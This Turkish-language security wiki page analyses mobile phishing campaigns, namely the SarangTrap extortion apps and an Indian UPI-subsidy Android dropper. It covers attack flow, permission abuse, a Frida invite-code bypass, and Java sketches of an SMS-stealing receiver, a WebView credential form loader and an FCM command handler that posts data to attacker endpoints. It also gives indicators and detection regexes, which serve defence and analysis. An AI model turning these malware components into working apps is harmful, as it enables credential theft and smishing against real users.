# Mobil Phishing ve Kötü Amaçlı Uygulama Dağıtımı (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin **kötü amaçlı Android APK'ları** ve **iOS mobil yapılandırma profilleri** dağıtmak için kullandığı teknikleri kapsar (phishing (SEO, sosyal mühendislik, sahte mağazalar, flört uygulamaları vb.)).
> Materyal, Zimperium zLabs tarafından ifşa edilen SarangTrap kampanyasından (2025) ve diğer kamu araştırmalarından uyarlanmıştır.

## Saldırı Akışı

1. **SEO/Phishing Altyapısı**
* Benzer görünümlü alan adlarını (flört, bulut paylaşımı, araç servisi…) kaydedin.
– Google'da sıralamak için `<title>` öğesinde yerel dil anahtar kelimeleri ve emojiler kullanın.
– *Hem* Android (`.apk`) hem de iOS kurulum talimatlarını aynı açılış sayfasında barındırın.
2. **İlk Aşama İndirme**
* Android: *imzasız* veya “üçüncü taraf mağaza” APK'sına doğrudan bağlantı.
* iOS: kötü amaçlı **mobileconfig** profiline `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
3. **Kurulum Sonrası Sosyal Mühendislik**
* Uygulama ilk çalıştırıldığında **davetiye / doğrulama kodu** ister (özel erişim yanılsaması).
* Kod, Komut ve Kontrol (C2) sunucusuna **HTTP üzerinden POST edilir**.
* C2 `{"success":true}` yanıtı verir ➜ kötü amaçlı yazılım devam eder.
* Geçerli bir kod göndermeyen Sandbox / AV dinamik analizi **kötü amaçlı davranış** görmez (kaçış).
4. **Çalışma Zamanı İzin Suistimali** (Android)
* Tehlikeli izinler yalnızca **pozitif C2 yanıtından sonra** istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Eski sürümler ayrıca SMS izinleri de isterdi -->
```
* Son varyantlar, `AndroidManifest.xml` dosyasından SMS için **`<uses-permission>` kaldırır** ancak SMS'i yansıma yoluyla okuyan Java/Kotlin kod yolunu bırakır ⇒ izin veren cihazlarda hala işlevsel kalırken statik puanı düşürür.
5. **Facade UI ve Arka Plan Toplama**
* Uygulama, yerel olarak uygulanan zararsız görünümler (SMS görüntüleyici, galeri seçici) gösterir.
* Bu arada, aşağıdakileri dışarı aktarır:
- IMEI / IMSI, telefon numarası
- Tam `ContactsContract` dökümü (JSON dizisi)
- Boyutunu azaltmak için [Luban](https://github.com/Curzibn/Luban) ile sıkıştırılmış JPEG/PNG dosyaları `/sdcard/DCIM`'den
- Opsiyonel SMS içeriği (`content://sms`)
Yükler **toplu olarak ziplenir** ve `HTTP POST /upload.php` üzerinden gönderilir.
6. **iOS Dağıtım Tekniği**
* Tek bir **mobil yapılandırma profili**, cihazı “MDM” benzeri denetim altına almak için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.
* Sosyal mühendislik talimatları:
1. Ayarları Aç ➜ *Profil indirildi*.
2. *Yükle* butonuna üç kez dokunun (phishing sayfasındaki ekran görüntüleri).
3. İmzalanmamış profili güvenilir kılın ➜ saldırgan *Kişiler* ve *Fotoğraf* yetkisini App Store incelemesi olmadan kazanır.
7. **Ağ Katmanı**
* Düz HTTP, genellikle `api.<phishingdomain>.com` gibi HOST başlığı ile 80 numaralı portta.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → kolayca tespit edilir).

## Savunma Testi / Kırmızı Takım İpuçları

* **Dinamik Analiz Kaçışı** – Kötü amaçlı yazılım değerlendirmesi sırasında, davetiye kodu aşamasını Frida/Objection ile otomatikleştirerek kötü amaçlı dalı ulaşın.
* **Manifest ile Çalışma Zamanı Farkı** – `aapt dump permissions` ile çalışma zamanı `PackageManager#getRequestedPermissions()`'ı karşılaştırın; tehlikeli izinlerin eksik olması bir kırmızı bayraktır.
* **Ağ Canary** – Kod girişi sonrası sağlam POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig İncelemesi** – `security cms -D -i profile.mobileconfig` komutunu macOS'ta kullanarak `PayloadContent` listesini çıkarın ve aşırı yetkileri tespit edin.

## Mavi Takım Tespit Fikirleri

* **Sertifika Şeffaflığı / DNS Analitiği** aniden anahtar kelime açısından zengin alan adlarının patlamalarını yakalamak için.
* **User-Agent ve Yol Regex**: `(?i)POST\s+/(check|upload)\.php` Dalvik istemcilerinden Google Play dışında.
* **Davet Kodu Telemetresi** – APK kurulumu sonrası kısa bir süre içinde 6–8 haneli sayısal kodların POST edilmesi, sahneleme göstergesi olabilir.
* **MobileConfig İmzalama** – İmzalanmamış yapılandırma profillerini MDM politikası aracılığıyla engelleyin.

## Kullanışlı Frida Kodu: Davetiye Kodunu Otomatik Olarak Atla
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Ödeme Phishing (UPI) – Dropper + FCM C2 Deseni

Bu desen, Hindistan'daki UPI kimlik bilgilerini ve OTP'leri çalmak için hükümet yardımı temalarını kötüye kullanan kampanyalarda gözlemlenmiştir. Operatörler, teslimat ve dayanıklılık için güvenilir platformları zincirler.

### Güvenilir platformlar arasında teslimat zinciri
- YouTube video tuzağı → açıklama kısa bir bağlantı içeriyor
- Kısa bağlantı → gerçek portalı taklit eden GitHub Pages phishing sitesi
- Aynı GitHub deposu, dosyaya doğrudan bağlantı veren sahte “Google Play” rozeti ile bir APK barındırıyor
- Dinamik phishing sayfaları Replit'te yaşıyor; uzaktan komut kanalı Firebase Cloud Messaging (FCM) kullanıyor

### Gömülü yük ve çevrimdışı kurulum ile Dropper
- İlk APK, gerçek kötü amaçlı yazılımı `assets/app.apk` konumunda gönderen bir yükleyicidir (dropper) ve kullanıcıdan bulut tespitini azaltmak için Wi‑Fi/mobil veriyi devre dışı bırakmasını ister.
- Gömülü yük, masum bir etiket altında (örneğin, “Güvenli Güncelleme”) kurulur. Kurulumdan sonra, hem yükleyici hem de yük ayrı uygulamalar olarak mevcuttur.

Statik triage ipucu (gömülü yükler için grep):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Kısa bağlantı aracılığıyla dinamik uç nokta keşfi
- Kötü amaçlı yazılım, bir kısa bağlantıdan düz metin, virgülle ayrılmış canlı uç noktalar listesini alır; basit dize dönüşümleri nihai phishing sayfası yolunu üretir.

Örnek (temizlenmiş):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView tabanlı UPI kimlik bilgisi toplama
- “₹1 / UPI‑Lite ödemesi yap” adımı, bir WebView içindeki dinamik uç noktadan bir saldırgan HTML formunu yükler ve hassas alanları (telefon, banka, UPI PIN) yakalar; bu bilgiler `addup.php`'ye `POST` edilir.

Minimal yükleyici:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kendiliğinden yayılma ve SMS/OTP kesme
- İlk çalıştırmada agresif izinler talep edilir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kurbanın cihazından toplu olarak smishing SMS göndermek için kişiler döngüye alınıyor.
- Gelen SMS'ler bir yayın alıcısı tarafından engelleniyor ve `/addsm.php` adresine meta verilerle (gönderen, içerik, SIM yuvası, cihaza özgü rastgele ID) yükleniyor.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) dayanıklı C2 olarak
- Yük, FCM'ye kaydolur; itme mesajları, eylemleri tetiklemek için bir anahtar olarak kullanılan bir `_type` alanı taşır (örneğin, phishing metin şablonlarını güncelleme, davranışları değiştirme).

Örnek FCM yükü:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler taslağı:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Avlanma desenleri ve IOC'ler
- APK, `assets/app.apk`'de ikincil yük içerir
- WebView, `gate.htm`'den ödeme yükler ve `/addup.php`'ye dışarı sızdırır
- SMS dışarı sızdırma `/addsm.php`'ye
- Kısa bağlantı ile yapı alma (örneğin, `rebrand.ly/*`) CSV uç noktaları döndürür
- Genel "Güncelleme/Güvenli Güncelleme" olarak etiketlenmiş uygulamalar
- Güvenilmeyen uygulamalarda `_type` ayırıcı ile FCM `data` mesajları

### Tespit ve savunma fikirleri
- Kullanıcılara kurulum sırasında ağı devre dışı bırakmalarını söyleyen ve ardından `assets/`'den ikinci bir APK yükleyen uygulamaları işaretleyin.
- İzin demeti üzerinde uyarı: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView tabanlı ödeme akışları.
- Kurumsal olmayan ana bilgisayarlarda `POST /addup.php|/addsm.php` için çıkış izleme; bilinen altyapıyı engelleyin.
- Mobil EDR kuralları: FCM için kayıtlı güvenilmeyen uygulama ve `_type` alanına göre dallanma.

---

## Referanslar

- [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android görüntü sıkıştırma kütüphanesi](https://github.com/Curzibn/Luban)
- [Android Kötü Amaçlı Yazılımı, Finansal Verileri Çalmak İçin Enerji Sübvansiyonu Vaadi (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Belgeler](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
